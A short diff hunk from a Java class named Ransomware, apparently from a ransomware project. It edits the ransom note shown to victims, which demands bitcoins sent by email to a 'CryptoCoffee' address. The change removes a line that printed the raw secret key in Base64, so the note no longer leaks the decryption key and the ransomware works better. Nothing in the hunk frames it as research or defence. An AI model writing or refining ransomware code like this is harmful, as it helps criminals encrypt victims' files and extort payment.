@@ -266,8 +266,7 @@ public class Ransomware {
 		String note = "To whom concern it may,"
 				+ "\r\nAll files in your base are belong to a very strong algorithm. Please do not attempt "
 				+ "to fix your files, it does not recover you. \r\nPlease send an email to customerService@cryptoCoffee.com "
-				+ "with your name, bitcoins and this code: \r\n\r\n" + encodedSecretKey + "\r\n"
-				+ Base64.getEncoder().encodeToString(secretKey.getEncoded())
+				+ "with your name, bitcoins and this code: \r\n\r\n" + encodedSecretKey
 				+ "\r\n\r\nAfter send you email with the bitcoins, we promptly "
 				+ "will direction you on how to recover precious files. Keep faith in us, we will help you.\r\nAll systems unsafe,"
 				+ "\r\nCryptoCoffee";
